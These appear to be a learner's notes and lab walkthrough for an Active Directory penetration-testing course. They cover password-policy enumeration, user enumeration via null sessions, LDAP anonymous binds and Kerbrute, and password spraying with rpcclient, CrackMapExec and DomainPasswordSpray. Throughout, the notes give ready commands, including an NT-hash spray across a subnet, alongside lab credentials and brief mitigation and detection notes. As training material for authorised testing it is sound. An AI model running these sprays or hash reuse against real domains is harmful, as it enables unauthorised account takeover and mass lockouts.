### Enumerating the Password Policy - from Linux - Credentialed

```
# We can pull the domain password policy in several ways, depending on how the domain is configured 
# and whether or not we have valid domain credentials. 
# With valid domain credentials, the password policy can also be obtained remotely using tools such as 
# CrackMapExec or rpcclient. :

crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol    # Enum pass policy with mock pass dump
```

```
# We can use rpcclient to check a Domain Controller for SMB NULL session access.
# Once connected, we can issue an RPC command such as querydominfo to obtain information 
# about the domain and confirm NULL session access. :

rpcclient -U "" -N 172.16.5.5
rpcclient $> querydominfo
...
```

```
# Next, Let's try this using enum4linux. enum4linux is a tool built around the Samba suite of tools nmblookup, net, rpcclient and smbclient 
# to use for enumeration of windows hosts and domains. 
# It can be found pre-installed on many different penetration testing distros, including Parrot Security Linux. 
# Below we have an example output displaying information that can be provided by enum4linux. 
# Here are some common enumeration tools and the ports they use:
# Tool 	Ports

- nmblookup 	137/UDP
- nbtstat 	137/UDP
- net 	139/TCP, 135/TCP, TCP and UDP 135 and 49152-65535
- rpcclient 	135/TCP
- smbclient 	445/TCP

enum4linux -P 172.16.5.5                     # Using enum4linux
```

```
# The tool enum4linux-ng is a rewrite of enum4linux in Python, 
# but has additional features such as the ability to export data as YAML or JSON files 
# which can later be used to process the data further or feed it to other tools. 
# It also supports colored output, among other features :

enum4linux-ng -P 172.16.5.5 -oA ilfreight    # Using enum4linux-ng

# Enum4linux-ng provided us with a bit clearer output and handy JSON and YAML output using the -oA flag.

cat ilfreight.json                           # Displaying the contents of ilfreight.json
```

### Enumerating Null Session - from Windows

```
# It is less common to do this type of null session attack from Windows, 
# but we could use the command net use \\host\ipc$ "" /u:"" to establish 
# a null session from a windows machine and confirm if we can perform more of this type of attack.

C:\htb> net use \\DC01\ipc$ "" /u:""         # Establish a null session from windows          
```

```
#  Trigger different types of issues:

C:\htb> net use \\DC01\ipc$ "" /u:guest                                        # Error: Account is Disabled
System error 1331 has occurred.

This user can't sign in because this account is currently disabled.


C:\htb> net use \\DC01\ipc$ "password" /u:guest                                # Error: Password is Incorrect
System error 1326 has occurred.

The user name or password is incorrect.


C:\htb> net use \\DC01\ipc$ "password" /u:guest                                # Error: Account is locked out (Password Policy)
System error 1909 has occurred. 

The referenced account is currently locked out and may not be logged on to.
```

### Enumerating the Password Policy - from Linux - LDAP Anonymous Bind

[LDAP anon bind](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled)

```
# LDAP anonymous binds allow unauthenticated attackers to retrieve information from the domain, 
# such as a complete listing of users, groups, computers, user account attributes, and the domain password policy.
# This is a legacy configuration, and as of Windows Server 2003, only authenticated users are permitted to initiate LDAP requests.

# With an LDAP anonymous bind, we can use LDAP-specific enumeration tools such as 
# windapsearch.py, ldapsearch, ad-ldapdomaindump.py, etc., to pull the password policy. 
# With ldapsearch, it can be a bit cumbersome but doable. 

# One example command to get the password policy is as follows:

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 5
maxPwdAge: -9223372036854775808
minPwdAge: -864000000000
minPwdLength: 8
modifiedCountAtLastProm: 0
nextRid: 1002
pwdProperties: 1
pwdHistoryLength: 24


# Here we can see the minimum password length of 8, lockout threshold of 5, and password complexity is set (pwdProperties set to 1).
```

### Enumerating the Password Policy - from Windows

```
# If we can authenticate to the domain from a Windows host, 
# we can use built-in Windows binaries such as net.exe to retrieve the password policy.
# We can also use various tools such as PowerView, CrackMapExec ported to Windows, SharpMapExec, SharpView, etc.

C:\htb> net accounts                 # Using net.exe

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
The command completed successfully.


# Here we can glean the following information:

- Passwords never expire (Maximum password age set to Unlimited)
- The minimum password length is 8 so weak passwords are likely in use
- The lockout threshold is 5 wrong passwords
- Accounts remained locked out for 30 minutes
```

```
# PowerView is also quite handy for this:

PS C:\htb> import-module .\PowerView.ps1                # Using PowerView
PS C:\htb> Get-DomainPolicy

Unicode        : @{Unicode=yes}

GPODisplayName : Default Domain Policy


# PowerView gave us the same output as our net accounts command, 
# just in a different format but also revealed that password complexity is enabled (PasswordComplexity=1).
```

```
# As with Linux, we have many tools at our disposal to retrieve the password policy while on a Windows system, 
# whether it is our attack system or a system provided by the client. 
# PowerView/SharpView are always good bets, as are CrackMapExec, SharpMapExec, and others. 
# The choice of tools depends on the goal of the assessment, stealth considerations, any anti-virus or EDR in place, 
# and other potential restrictions on the target host. Let's cover a few examples.
```

### Task solution 

```
# First answer in a default domain table above.

SSH to 10.129.96.50 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!" 

ssh htb-student@10.129.96.50         # ssh with pass "HTB_@cademy_stdnt!" to init host
ip a                                 # check bind sub-networks on host NIC

# Also you can check what hosts are up (and it's DC in this lab) :
for ip in {1..254}; do ping -c 1 172.16.5.$ip > /dev/null 2>&1 && echo "172.16.5.$ip is up"; done

# But I just using ldapsearch example with grep from guide and target option :
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 minPwdLength   
```

### Password Spraying - Making a Target User List

#### Detailed User Enumeration

```
# To mount a successful password spraying attack, we first need a list of valid domain users to attempt to authenticate with. 
# There are several ways that we can gather a target list of valid users:

- By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller

- Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list

- Using a tool such as Kerbrute to validate users utilizing a word list from a source such as 
  the statistically-likely-usernames GitHub repo, 
  or gathered by using a tool such as linkedin2username to create a list of potentially valid users

- Using a set of credentials from a Linux or Windows attack system either provided by our client or 
  obtained through another means such as LLMNR/NBT-NS 
  response poisoning using Responder or even a successful password spray using a smaller wordlist
```

### SMB NULL Session to Pull User List

```
# If you are on an internal machine but don’t have valid domain credentials, 
# you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers. 
# Either of these will allow you to obtain an accurate list of all users within Active Directory and the password policy. 
# If you already have credentials for a domain user or SYSTEM access on a Windows host, 
# then you can easily query Active Directory for this information.

# It’s possible to do this using the SYSTEM account because it can impersonate the computer. 
# A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts). 
# If you don’t have a valid domain account, and SMB NULL sessions and LDAP anonymous binds are not possible, 
# you can create a user list using external resources such as email harvesting and LinkedIn.

# Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include enum4linux, rpcclient, and CrackMapExec, among others.
# Regardless of the tool, we'll have to do a bit of filtering to clean up the output and obtain a list of only usernames, one on each line. 
# We can do this with enum4linux with the -U flag.

enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"        # Using enum4linux
```

```
# We can use the enumdomusers command after connecting anonymously using rpcclient.

rpcclient -U "" -N 172.16.5.5                                                   # Using rpcclient
```

```
# Finally, we can use CrackMapExec with the --users flag. 
# This is a useful tool that will also show the badpwdcount (invalid login attempts), 
# so we can remove any accounts from our list that are close to the lockout threshold. 

# It also shows the baddpwdtime, which is the date and time of the last bad password attempt, 
# so we can see how close an account is to having its badpwdcount reset. :

crackmapexec smb 172.16.5.5 --users                                             # Using CrackMapExec --users Flag
```

### Gathering Users with LDAP Anonymous

```
# We can use various tools to gather users when we find an LDAP anonymous bind. 
# Some examples include windapsearch and ldapsearch. 

# If we choose to use ldapsearch we will need to specify a valid LDAP search filter. 
# We can learn more about these search filters in the Active Directory LDAP module. :

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

```
# Tools such as windapsearch make this easier (though we should still understand how to create our own LDAP search filters).
# Here we can specify anonymous access by providing a blank username 
# with the -u flag and the -U flag to tell the tool to retrieve just users.

./windapsearch.py --dc-ip 172.16.5.5 -u "" -U            # Using windapsearch
```

### Enumerating Users with Kerbrute

[jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt)
[statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
[linkedin2username](https://github.com/initstring/linkedin2username)

```
# This tool uses Kerberos Pre-Authentication, which is a much faster and potentially stealthier way to perform password spraying. 
# This method does not generate Windows event ID 4625: An account failed to log on, or a logon failure which is often monitored for. 
# The tool sends TGT requests to the domain controller without Kerberos Pre-Authentication to perform username enumeration. 
# If the KDC responds with the error PRINCIPAL UNKNOWN, the username is invalid. 
# Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid.

# Let's try out this method using the jsmith.txt wordlist of 48,705 possible common usernames in the format flast. :

kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt            # Kerbrute User Enumeration

# We've checked over 48,000 usernames in just over 12 seconds and discovered 50+ valid ones. (but it's an example case)
# If we are unable to create a valid username list using any of the methods highlighted above, 
# we could turn back to external information gathering and search for company email addresses or use a tool such as linkedin2username 
# to mash up possible usernames from a company's LinkedIn page.
```

### Credentialed Enumeration to Build our User List\

```
# With valid credentials, we can use any of the tools stated previously to build a user list. A quick and easy way is using CrackMapExec.

sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users       # Using CrackMapExec with Valid Credentials
```

### Task Solution

```
# SSH to 10.129.96.50 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!" 

ssh htb-student@10.129.96.50                                                    # ssh to init host
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt        # run kerbrute to find users
``` 

### Internal Password Spraying - from Linux

#### Internal Password Spraying from a Linux Host

```
# Once we’ve created a wordlist using one of the methods shown in the previous section, 
# it’s time to execute the attack. Rpcclient is an excellent option for performing this attack from Linux. 
# An important consideration is that a valid login is not immediately apparent with rpcclient, 
# with the response Authority Name indicating a successful login. 
# We can filter out invalid login attempts by grepping for Authority in the response. 

# Using a Bash one-liner for the Attack :

for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

```
# We can also use Kerbrute for the same attack as discussed previously.:

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1      # Using Kerbrute for the Attack
```

```
# Another great option is using CrackMapExec. 
# The ever-versatile tool accepts a text file of usernames to be run against a single password in a spraying attack. 
# Here we grep for + to filter out logon failures and hone in on only valid login attempts to ensure 
# we don't miss anything by scrolling through many lines of output.

sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +     # Using CrackMapExec & Filtering Logon Failures
```

```
# After getting one (or more!) hits with our password spraying attack, 
# we can then use CrackMapExec to validate the credentials quickly against a Domain Controller.

sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123                      # Validating the Credentials with CrackMapExec
```

### Local Administrator Password Reuse

```
# Internal password spraying is not only possible with domain user accounts. 
# If you obtain administrative access and the NTLM password hash or 
# cleartext password for the local administrator account (or another privileged local account), 
# this can be attempted across multiple hosts in the network. 
# Local administrator account password reuse is widespread due to the use of gold images in automated deployments 
# and the perceived ease of management by enforcing the same password across multiple host

# CrackMapExec is a handy tool for attempting this attack. 
# It is worth targeting high-value hosts such as SQL or Microsoft Exchange servers, 
# as they are more likely to have a highly privileged user logged in or have their credentials persistent in memory.

# Sometimes we may only retrieve the NTLM hash for the local administrator account from the local SAM database. 
# In these instances, we can spray the NT hash across an entire subnet (or multiple subnets) 
# to hunt for local administrator accounts with the same password set.

sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

# The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout. 
# Make sure this flag is set so we don't potentially lock out the built-in administrator for the domain.

# This technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth. 
# One way to remediate this issue is using the free Microsoft tool Local Administrator Password Solution (LAPS) 
# to have Active Directory manage local administrator passwords and enforce a unique password 
# on each host that rotates on a set interval.
```

### Task Solution 

```
SSH to 10.129.96.50 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!" 

ssh htb-student@10.129.96.50                                                    # ssh to init host

# We can scan network again but obvious that DC is 172.16.5.5
# Using kerbrute with aws to grep username only and save them to a file:

kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt | grep "VALID USERNAME" | awk -F '@' '{print $1}' | awk '{print $NF}' > valid_usernames.txt

# OR from crackmapexec/SMB side (low speed):

sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users | grep -oP '(?<=\\)[^ \t:]+' > valid_users2.txt

# Using rpcclient onliner with target password (checking with 2 option files):

for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
for u in $(cat valid_users2.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

# OR again with crackmapexec:

sudo crackmapexec smb 172.16.5.5 -u valid_users2.txt -p Welcome1
```

### Internal Password Spraying - from Windows

```
# From a foothold on a domain-joined Windows host, the DomainPasswordSpray tool is highly effective. 
# If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, 
# query the domain password policy, and exclude user accounts within one attempt of locking out. 

# Like how we ran the spraying attack from our Linux host, we can also supply a user list to the tool if we are on a Windows host 
# but not authenticated to the domain. 

# There are several options available to us with the tool. 
# Since the host is domain-joined, we will skip the -UserList flag and let the tool generate a list for us. 
# We'll supply the Password flag and one single password and then use the -OutFile flag to write our output to a file for later use.

# Using DomainPasswordSpray.ps1:

PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

# We could also utilize Kerbrute to perform the same user enumeration and spraying steps shown in the previous section. 
```

### Mitigations

```
# Several steps can be taken to mitigate the risk of password spraying attacks. 
# While no single solution will entirely prevent the attack, 
# a defense-in-depth approach will render password spraying attacks extremely difficult.

- Multi-factor Authentication
- Restricting Access
- Reducing Impact of Successful Exploitation
- Password Hygiene
```

### Other Considerations

```
# It is vital to ensure that your domain password lockout policy doesn’t increase the risk of denial of service attacks. 
# If it is very restrictive and requires an administrative intervention to unlock accounts manually, 
# a careless password spray may lock out many accounts within a short period.
```


### Detection

```
# In the Domain Controller’s security log, many instances of event ID 4625: 
# An account failed to log on over a short period may indicate a password spraying attack. 

# Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. 
# A more savvy attacker may avoid SMB password spraying and instead target LDAP.

# Organizations should also monitor event ID 4771: Kerberos pre-authentication failed, which may indicate an LDAP password spraying attempt. 
# To do so, they will need to enable Kerberos logging. 
```

### External Password Spraying

```
# While outside the scope of this module, password spraying is also a common way that attackers use to attempt to gain a foothold on the internet.
# We have been very successful with this method during penetration tests to gain access to sensitive data through email inboxes 
# or web applications such as externally facing intranet sites. Some common targets include:

- Microsoft 0365
- Outlook Web Exchange
- Exchange Web Access
- Skype for Business
- Lync Server
- Microsoft Remote Desktop Services (RDS) Portals
- Citrix portals using AD authentication
- VDI implementations using AD authentication such as VMware Horizon
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
- Custom web applications that use AD authentication
```

### Task solution

```
RDP to 10.129.156.90 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!" 

xfreerdp /v:10.129.156.90 /u:htb-student /p:Academy_student_AD!   # Login to host, next open PS (Admin) and go to C:Tools folder

Import-Module .\DomainPasswordSpray.ps1                           # Import tool
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue       # Run with target pass
```
